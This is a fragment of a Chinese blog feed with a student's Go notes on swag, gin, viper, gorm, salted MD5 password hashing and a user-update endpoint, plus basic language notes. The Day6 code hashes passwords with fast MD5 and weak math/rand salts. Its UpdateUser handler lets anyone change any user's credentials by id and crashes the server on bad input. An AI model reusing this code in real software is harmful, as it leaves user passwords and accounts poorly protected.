github.com/swaggo/swag/cmd/swag@latest<br><span class="hljs-comment">//废了一个多小时,勉强找到了算是解决办法的办法,傻逼东西,纯nt</span><br><span class="hljs-comment">//根本原因就是GOBIN跟GOPATH不一样,东西下载在GOPATH的bin目录下,但是调用的时候是用GOBIN路径,但是网上说的设置GOBIN路径的没有一个是能用的,最后把GOPATH的exe复制到GOBIN里,直接完事</span><br><span class="hljs-comment">//最后找着了,是在用户变量里新建GOBIN,配置路径</span><br><span class="hljs-comment">//go env GOBIN出了一次配好的路径,再来一次就没了</span><br></code></pre></td></tr></table></figure><h1 id="Day4"><a href="#Day4" class="headerlink" title="Day4"></a>Day4</h1><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20231015123045.png"><br>昨晚装了一晚上没弄好,回宿舍又找了n久,说可能得调GOROOT的路径,然后今天来了一试,GOPATH它又出来了,难道重启电脑真是解决问题的最好答案吗</p><h2 id="swag-1"><a href="#swag-1" class="headerlink" title="swag"></a>swag</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//今天又是跟swagger不死不休的一天</span><br><span class="hljs-comment">//总结,浪费了快9个,得到了还是得用goland不能用vsc的道理</span><br><span class="hljs-comment">//像群友说的一样拥抱goland好了</span><br><br><span class="hljs-comment">//具体操作没啥好说的了</span><br>swag init<br>swag init -g /service/index.html<br><span class="hljs-keyword">go</span> run main.<span class="hljs-keyword">go</span><br></code></pre></td></tr></table></figure><h2 id="配下goland"><a href="#配下goland" class="headerlink" title="配下goland"></a>配下goland</h2><h1 id="Day5"><a href="#Day5" class="headerlink" title="Day5"></a>Day5</h1><p>现在看看swag的功能确实挺方便的,但不知道为什么vsc里打开的终端就是不能用</p><p>捣鼓了昨天一天,对这玩意大概了解了.<br>就是一个类似apifox自动化测试的东西,在后端写出了业务逻辑需要测试,要么就手动curl发请求,要么就是apifox写好请求发过去,然后这个swag是在程序界面,用特定的方式(就是&#x2F;&#x2F; @)写好注释,在init之后,就会在url&#x2F;swagger&#x2F;index.html生成对应的请求方法,就是比较方便(好像还有自动写文档的功能?没用到还)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">go install github.com/swaggo/swag/cmd/swag@latest<br>//然后使用时会自动导包<br>//app.go<br>//前面的是别名<br>&quot;IM_project/docs&quot;<br>&quot;IM_project/service&quot;<br><br>&quot;github.com/gin-gonic/gin&quot;<br>swaggerfiles &quot;github.com/swaggo/files&quot;<br>ginSwagger &quot;github.com/swaggo/gin-swagger&quot;<br></code></pre></td></tr></table></figure><p>剩下的现用现查吧,主要东西都在注释里了</p><h2 id="new"><a href="#new" class="headerlink" title="new"></a>new</h2><p>增删改查(CRUD)正式收工<br>Create<br>Read<br>Update<br>Delete</p><h2 id="对U的信息校验"><a href="#对U的信息校验" class="headerlink" title="对U的信息校验"></a>对U的信息校验</h2><p>比如说在手机号那里输字母,进行这种校验</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">go get github.com/asaskevich/govalidator<br></code></pre></td></tr></table></figure><h2 id="新加修改手机号和邮箱"><a href="#新加修改手机号和邮箱" class="headerlink" title="新加修改手机号和邮箱"></a>新加修改手机号和邮箱</h2><h2 id="防止已注册的手机号-名字-邮箱重复注册"><a href="#防止已注册的手机号-名字-邮箱重复注册" class="headerlink" title="防止已注册的手机号&#x2F;名字&#x2F;邮箱重复注册"></a>防止已注册的手机号&#x2F;名字&#x2F;邮箱重复注册</h2><p>魔改了不少,终于有点自己的想法了</p><h1 id="Day6"><a href="#Day6" class="headerlink" title="Day6"></a>Day6</h1><h2 id="加盐加密"><a href="#加盐加密" class="headerlink" title="加盐加密"></a>加盐加密</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 小写</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Md5Encode</span><span class="hljs-params">(data <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">string</span> &#123;<br>h := md5.New()<br>h.Write([]<span class="hljs-type">byte</span>(data))<br>tempStr := h.Sum(<span class="hljs-literal">nil</span>)<br><span class="hljs-keyword">return</span> hex.EncodeToString(tempStr)<br>&#125;<br><br><span class="hljs-comment">// 大写</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">MD5Encode</span><span class="hljs-params">(data <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> strings.ToUpper(Md5Encode(data))<br>&#125;<br><br><span class="hljs-comment">// 加密</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">MakePassword</span><span class="hljs-params">(plainpwd, salt <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> Md5Encode(plainpwd + salt)<br>&#125;<br><br><span class="hljs-comment">// 解密</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ValidPassword</span><span class="hljs-params">(plainpwd, salt <span class="hljs-type">string</span>, passwd <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> Md5Encode(plainpwd+salt) == passwd<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">整体逻辑</span><br><span class="hljs-comment">1.传入用户输入的密码和随机生成的盐,并拼接字符串</span><br><span class="hljs-comment">2.将拼接生成的新字符串传入md5加密函数</span><br><span class="hljs-comment">3.对拼接的字符串，对其进行 MD5 加密，然后返回结果的十六进制表示。</span><br><span class="hljs-comment">4.将加密后的密码和盐传入数据库</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>在密码学和计算机安全领域，散列（Hash）是一种将任意长度的数据映射为固定长度数据的过程。它的核心目标是将输入数据（称为消息）通过一种数学算法，转换为固定长度的字符串，通常是一串数字和字母组成的十六进制值。这个输出字符串通常称为“散列值”或“摘要”。</p><p>散列函数有以下特点：</p><ul><li>固定输出长度：无论输入数据的大小，散列函数都生成相同长度的输出，这个输出的长度是固定的。</li><li>雪崩效应：即使输入数据的微小变化，散列值应该有显著的差异，这称为雪崩效应。这是散列函数的一个关键特性，因为它保证了数据的微小改变会导致完全不同的散列值。</li><li>不可逆性：理论上，从散列值不能还原出原始输入数据。这是散列函数的一个重要特性，通常用于存储密码的散列值，因为不应该直接从密码的散列值反向计算出密码本身。</li><li>快速计算：散列函数需要在合理的时间内计算出结果，以便广泛的应用。</li></ul><p>散列函数在信息安全中有多种应用，包括密码存储、数据完整性验证、数字签名、数字证书等领域。常见的散列算法包括 MD5、SHA-1、SHA-256 等，其中 SHA 系列较为安全，因此在许多安全应用中被广泛使用。但请注意，随着计算能力的增强，一些散列算法可能不再足够安全，需要采用更强大的算法。</p><h2 id="用户登录"><a href="#用户登录" class="headerlink" title="用户登录"></a>用户登录</h2><p>post请求,更安全点</p><h2 id="修改用户信息"><a href="#修改用户信息" class="headerlink" title="修改用户信息"></a>修改用户信息</h2><p>盐重新生成并修改数据库中的盐<br>加了id校验,视频里面是没有这个的(也可能在后面我还没看到)<br>但感觉好像没必要,因为真要修改信息的话,肯定是先确定账密(也可能再调用一遍login?),然后修改,不会让用户输入id进行判断是否存在,这个功能后面应该是得删掉的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// UpdateUser</span><br><span class="hljs-comment">// @Summary 修改用户信息</span><br><span class="hljs-comment">// @Tags 用户模块</span><br><span class="hljs-comment">// @Param id formData string false &quot;id&quot;</span><br><span class="hljs-comment">// @Param name formData string false &quot;用户名&quot;</span><br><span class="hljs-comment">// @Param password formData string false &quot;密码&quot;</span><br><span class="hljs-comment">// @Param email formData string false &quot;邮箱&quot;</span><br><span class="hljs-comment">// @Param phone formData string false &quot;手机号&quot;</span><br><span class="hljs-comment">// @Success 200 &#123;string&#125; json&#123;&quot;code&quot;,&quot;message&quot;&#125;</span><br><span class="hljs-comment">// @Router /user/updateUser [post]</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">UpdateUser</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br><span class="hljs-comment">//根据用户id修改信息,但是id不存在时未进行校验</span><br>user := models.UserBasic&#123;&#125;<br>id, err := strconv.Atoi(c.PostForm(<span class="hljs-string">&quot;id&quot;</span>))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalln(err)<br>&#125;<br>user.ID = <span class="hljs-type">uint</span>(id)<br>is_Exit, _ := models.FindUserById(user.ID)<br><span class="hljs-keyword">if</span> !is_Exit &#123;<br>c.JSON(<span class="hljs-number">400</span>, gin.H&#123;<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;用户不存在!&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br>user.Name = c.PostForm(<span class="hljs-string">&quot;name&quot;</span>)<br>passwd := c.PostForm(<span class="hljs-string">&quot;password&quot;</span>)<br>salt := fmt.Sprintf(<span class="hljs-string">&quot;%06d&quot;</span>, rand.Int31())<br>user.PassWord = utils.MakePassword(passwd, salt)<br>user.Phone = c.PostForm(<span class="hljs-string">&quot;phone&quot;</span>)<br>user.Email = c.PostForm(<span class="hljs-string">&quot;email&quot;</span>)<br>user.Salt = salt<br><span class="hljs-comment">//对用户输入信息进行校验</span><br><span class="hljs-comment">//调用govalidator包的ValidateStruct方法对传入的结构体进行内容校验,校验方法就是在定义结构体时`valid:&quot;&quot;`里写的内容</span><br>_, err = govalidator.ValidateStruct(user)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(err)<br>c.JSON(<span class="hljs-number">400</span>, gin.H&#123;<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;修改用户信息格式错误!&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>err = models.UpdateUser(user)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalln(err)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;update :&quot;</span>, user)<br>c.JSON(<span class="hljs-number">200</span>, gin.H&#123;<br><span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;修改用户信息成功&quot;</span>,<br>&#125;)<br>&#125;<br>&#125;<br><br><br><span class="hljs-comment">//finduserbyid</span><br>unc FindUserById(id <span class="hljs-type">uint</span>) (<span class="hljs-type">bool</span>, UserBasic) &#123;<br>user := UserBasic&#123;&#125;<br>utils.DB.Where(<span class="hljs-string">&quot;id = ?&quot;</span>, id).First(&amp;user)<br><span class="hljs-keyword">if</span> user.ID != <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>, user<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, user<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="新学的东西"><a href="#新学的东西" class="headerlink" title="新学的东西"></a>新学的东西</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>对请求分批处理,分成很多小份,交给不同的程序处理</p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="gin相关"><a href="#gin相关" class="headerlink" title="gin相关"></a>gin相关</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//返回值是*gin.Engine</span><br>r:=gin.Default()<br><span class="hljs-comment">//类似http.HandleFunc(&quot;/&quot;, indexHandler),用当请求index时,调用service.GetIndex函数处理</span><br>r.Get(<span class="hljs-string">&quot;index&quot;</span>,service.GetIndex)<br></code></pre></td></tr></table></figure><h3 id="viper相关"><a href="#viper相关" class="headerlink" title="viper相关"></a>viper相关</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//设置获取文件的路径,即在./config目录下查找对应文件</span><br>viper.AddConfigPath(<span class="hljs-string">&quot;config&quot;</span>)<br><span class="hljs-comment">//设置文件名字,即在./config目录下查找名为&quot;app&quot;的文件,因为能获取各种配置文件,所以不用写后缀名/扩展名</span><br>viper.SetConfigName(<span class="hljs-string">&quot;app&quot;</span>)<br><span class="hljs-comment">//检测是否能正常读取配置文件</span><br>err := viper.ReadInConfig()<br><span class="hljs-comment">//在读取到app.yml文件后,获取mysql.username这个键对应的值(),并强制转换成string类型变量</span><br>username := viper.GetString(<span class="hljs-string">&quot;mysql.username&quot;</span>)<br><span class="hljs-comment">//获取配置中的子配置项</span><br>options := viper.Sub(<span class="hljs-string">&quot;mysql.options&quot;</span>)<br>charset := options.GetString(<span class="hljs-string">&quot;charset&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="gorm相关"><a href="#gorm相关" class="headerlink" title="gorm相关"></a>gorm相关</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//gorm这里是数据库类型(MySQL、PostgreSQL、SQLite等)</span><br><span class="hljs-comment">//opts是一个可选参数列表，用于传递额外的选项，以配置数据库连接。这些选项是 gorm.Option 类型的可变参数。你可以使用这些选项来配置数据库的行为，例如启用日志记录、设置连接池大小等,这里是&amp;gorm.Config&#123;&#125;,这里没再填写具体参数,填写的话可以对数据库连接进行更精细的操作,比如打开日志,但是为什么传递指针还不是很明白,这里是空的,所以直接不写这个也可以。</span><br>mysql.Open(<span class="hljs-string">&quot;root:root@tcp(127.0.0.1:3306)/IM)</span><br><span class="hljs-string">func gorm.Open(dialector gorm.Dialector, opts ...gorm.Option) (db *gorm.DB, err error)</span><br><span class="hljs-string"></span><br><span class="hljs-string">//db：这是一个 *gorm.DB 类型的指针，表示成功打开的数据库连接。*gorm.DB 是 GORM 库的主要接口，用于执行数据库操作。</span><br><span class="hljs-string">//err：这是一个 error 类型的返回值，用于表示在打开数据库连接时是否发生了错误。如果打开成功，err 为 nil；如果发生错误，将包含错误信息。</span><br><span class="hljs-string">db, err := gorm.Open(mysql.Open(&quot;</span>root:root@tcp(<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">3306</span>)/IM?charset=utf8mb4&amp;parseTime=True&amp;loc=Local<span class="hljs-string">&quot;), &amp;gorm.Config&#123;&#125;)</span><br></code></pre></td></tr></table></figure><h3 id="不知道放在哪的"><a href="#不知道放在哪的" class="headerlink" title="不知道放在哪的"></a>不知道放在哪的</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><br>Q: 那用户能在页面看到message<span class="hljs-string">&quot; 字段的值 &quot;</span>welecome!!<span class="hljs-string">&quot;,是通过c.JSON()还是gin.H&#123;&#125;,就是是哪个函数把message&quot;</span> 字段的值 <span class="hljs-string">&quot;welecome!!&quot;</span>打印在页面上传给用户的<br><br>A: 在用户的浏览器页面上看到 <span class="hljs-string">&quot;message&quot;</span> 字段的值 <span class="hljs-string">&quot;welecome!!&quot;</span> 实际上是通过 c.<span class="hljs-keyword">JSON() </span>这个函数实现的。<br>c.<span class="hljs-keyword">JSON(200, </span>...) 函数用于生成 <span class="hljs-keyword">JSON </span>格式的响应，其中的参数是 HTTP 状态码和包含要返回的 <span class="hljs-keyword">JSON </span>数据的 Go 数据结构。在这里，gin.H&#123; <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;welecome!!&quot;</span> &#125; 构建了 <span class="hljs-keyword">JSON </span>数据，而 c.<span class="hljs-keyword">JSON(200, </span>...) 把这个 <span class="hljs-keyword">JSON </span>数据包装成 HTTP 响应并发送给客户端。<br>这意味着用户在浏览器上看到的 <span class="hljs-string">&quot;message&quot;</span> 字段的值 <span class="hljs-string">&quot;welecome!!&quot;</span> 是由 c.<span class="hljs-keyword">JSON(200, </span>...) 函数生成的响应传输到客户端的结果。所以，c.<span class="hljs-keyword">JSON() </span>函数实际上是将 <span class="hljs-keyword">JSON </span>数据发送给用户的一部分，而 gin.H&#123;&#125; 只是用于构建 <span class="hljs-keyword">JSON </span>数据的辅助工具。<br></code></pre></td></tr></table></figure><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//1.</span><br>gin.Default()返回值<br>*gin.Engine<br><br><span class="hljs-comment">//2.</span><br>gorm.Model<br><span class="hljs-keyword">type</span> Model <span class="hljs-keyword">struct</span> &#123;<br>ID        <span class="hljs-type">uint</span> <span class="hljs-string">`gorm:&quot;primarykey&quot;`</span><br>CreatedAt time.Time<br>UpdatedAt time.Time<br>DeletedAt DeletedAt <span class="hljs-string">`gorm:&quot;index&quot;`</span><br>&#125;<br><br><span class="hljs-comment">//3.</span><br>*gorm.DB<br><br><span class="hljs-comment">//4.</span><br>*gin.Context<br><span class="hljs-comment">//r.GET(&quot;/user/getUserList&quot;, service.GetUserList)</span><br><span class="hljs-comment">//当有请求进行访问/user/getUserList时, service.GetUserList()会接收到一个  </span><br><span class="hljs-comment">//c *gin.Context类型的变量,这里的c是一个上下文对象,通过这个上下文对象，可以访问请求的参数、请求头、请求体，以及设置响应等操作。</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>lang</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>go函数库</title>
    <link href="/2023/10/01/go%E5%87%BD%E6%95%B0%E5%BA%93/"/>
    <url>/2023/10/01/go%E5%87%BD%E6%95%B0%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<p>rt</p><h1 id="net包"><a href="#net包" class="headerlink" title="net包"></a>net包</h1><h2 id="net-Dial"><a href="#net-Dial" class="headerlink" title="net.Dial()"></a>net.Dial()</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">conn, err := net.Dial(<span class="hljs-string">&quot;tcp&quot;</span>, <span class="hljs-string">&quot;127.0.0.1:12345&quot;</span>)<br><span class="hljs-comment">//net.Dial()函数有两个参数,第一个是可选的协议,例如tcp,udp等,第二个参数是进行连接的ip地址,返回值是一个 Conn 接口类型的对象和一个可能的错误,它可以用于在网络上进行数据的读写操作。</span><br></code></pre></td></tr></table></figure><h1 id="log包"><a href="#log包" class="headerlink" title="log包"></a>log包</h1><h2 id="log-Fatalln"><a href="#log-Fatalln" class="headerlink" title="log.Fatalln()"></a>log.Fatalln()</h2><p>fatal line 致命线,就是打印并强制退出程序</p><h1 id="bufio包"><a href="#bufio包" class="headerlink" title="bufio包"></a>bufio包</h1><p>buffered input&#x2F;output,缓冲输入&#x2F;输出</p><h2 id="bufio-NewReader"><a href="#bufio-NewReader" class="headerlink" title="bufio.NewReader()"></a>bufio.NewReader()</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go">inputReader := bufio.NewReader(os.Stdin)<br><span class="hljs-comment">//os.Stdin是读取用户的输入,bufio.NewReader()创建一个带有缓冲的读取器，该读取器从标准输入（通常是终端输入）读取数据。后面可以再对创建的这个对象进行操作,比如读取出用户的输入内容,bufio.NewReader()跟os.Stdin基本是绑定的</span><br><br><span class="hljs-keyword">for</span> &#123;<br>    input, _ := inputReader.ReadString(<span class="hljs-string">&#x27;\n&#x27;</span>) <span class="hljs-comment">// 读取用户输入</span><br>    inputInfo := strings.Trim(input, <span class="hljs-string">&quot;\r\n&quot;</span>)<br>    <span class="hljs-keyword">if</span> strings.ToUpper(inputInfo) == <span class="hljs-string">&quot;Q&quot;</span> &#123; <span class="hljs-comment">// 如果输入q就退出</span><br>        <span class="hljs-keyword">return</span><br>    &#125;<br>&#125;<br><span class="hljs-comment">//inputReader.ReadString()才是真正读取用户输入的函数,NewReader()只是创建了这个对象,当用户输入\n也就是敲回车时就停止读取</span><br><span class="hljs-comment">//inputInfo := strings.Trim(input, &quot;\r\n&quot;) strings.Trim()是删除变量中的对应字符,\n和\r都是回车换行</span><br><span class="hljs-comment">//strings.ToUpper(inputInfo) == &quot;Q&quot;   这个定义的是退出程序,strings.ToUpper()是读取字母并转换为大写,再与Q进行判断,就是如果用户输入的是q或者Q就会退出程序</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>lang</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>go查漏补缺</title>
    <link href="/2023/09/26/go%E6%9F%A5%E6%BC%8F%E8%A1%A5%E7%BC%BA/"/>
    <url>/2023/09/26/go%E6%9F%A5%E6%BC%8F%E8%A1%A5%E7%BC%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="基础篇"><a href="#基础篇" class="headerlink" title="基础篇"></a>基础篇</h1><h2 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h2><p>rune  uint8</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 遍历字符串</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">traversalString</span><span class="hljs-params">()</span></span> &#123;<br>    s := <span class="hljs-string">&quot;pprof.cn博客&quot;</span><br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(s); i++ &#123; <span class="hljs-comment">//byte</span><br>        fmt.Printf(<span class="hljs-string">&quot;%v(%c) &quot;</span>, s[i], s[i])<br>    &#125;<br>    fmt.Println()<br>    <span class="hljs-keyword">for</span> _, r := <span class="hljs-keyword">range</span> s &#123; <span class="hljs-comment">//rune</span><br>        fmt.Printf(<span class="hljs-string">&quot;%v(%c) &quot;</span>, r, r)<br>    &#125;<br>    fmt.Println()<br>&#125;<br></code></pre></td></tr></table></figure><p>结果是</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clojure"><span class="hljs-number">112</span>(<span class="hljs-name">p</span>) <span class="hljs-number">112</span>(<span class="hljs-name">p</span>) <span class="hljs-number">114</span>(<span class="hljs-name">r</span>) <span class="hljs-number">111</span>(<span class="hljs-name">o</span>) <span class="hljs-number">102</span>(<span class="hljs-name">f</span>) <span class="hljs-number">46</span>(<span class="hljs-name"><span class="hljs-built_in">.</span></span>) <span class="hljs-number">99</span>(<span class="hljs-name">c</span>) <span class="hljs-number">110</span>(<span class="hljs-name">n</span>) <span class="hljs-number">229</span>(å) <span class="hljs-number">141</span>() <span class="hljs-number">154</span>() <span class="hljs-number">229</span>(å) <span class="hljs-number">174</span>(®) <span class="hljs-number">162</span>(¢)<br><span class="hljs-number">112</span>(<span class="hljs-name">p</span>) <span class="hljs-number">112</span>(<span class="hljs-name">p</span>) <span class="hljs-number">114</span>(<span class="hljs-name">r</span>) <span class="hljs-number">111</span>(<span class="hljs-name">o</span>) <span class="hljs-number">102</span>(<span class="hljs-name">f</span>) <span class="hljs-number">46</span>(<span class="hljs-name"><span class="hljs-built_in">.</span></span>) <span class="hljs-number">99</span>(<span class="hljs-name">c</span>) <span class="hljs-number">110</span>(<span class="hljs-name">n</span>) <span class="hljs-number">21338</span>(博) <span class="hljs-number">23458</span>(客)<br></code></pre></td></tr></table></figure><p>可以uint8是单独取出字符串中每个元素的ascii码进行处理,超出ascii码的范围就做不到了,像这种中文的就打印不出来</p><h2 id="修改字符串"><a href="#修改字符串" class="headerlink" title="修改字符串"></a>修改字符串</h2><p>要修改一个字符串,首先需要把字符串转换成数组类型,然后再进行修改</p><h2 id="数组赋值"><a href="#数组赋值" class="headerlink" title="数组赋值"></a>数组赋值</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> c [<span class="hljs-number">5</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">2</span>:<span class="hljs-number">40</span>,<span class="hljs-number">4</span>:<span class="hljs-number">50</span>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">c[0] = 0</span><br><span class="hljs-comment">c[1] = 0</span><br><span class="hljs-comment">c[2] = 100</span><br><span class="hljs-comment">c[3] = 0</span><br><span class="hljs-comment">c[4] = 200</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">for</span> _,i := <span class="hljs-keyword">range</span> c&#123;<br>    fmt.<span class="hljs-built_in">println</span>(i)<br>&#125;<br><span class="hljs-comment">//for range 会返回索引和值,要用大括号</span><br></code></pre></td></tr></table></figure><p>%s打印字符串<br>%p是打印地址<br>%v是检测变量类型自动打印<br>%#v是检测变量类型并详细的自动打印</p><h2 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h2><p>var s1 []int<br>s2:&#x3D;[]int{}<br>这个准确来说是</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">s2:=[]<span class="hljs-type">int</span>&#123;<br><br>&#125;<br><span 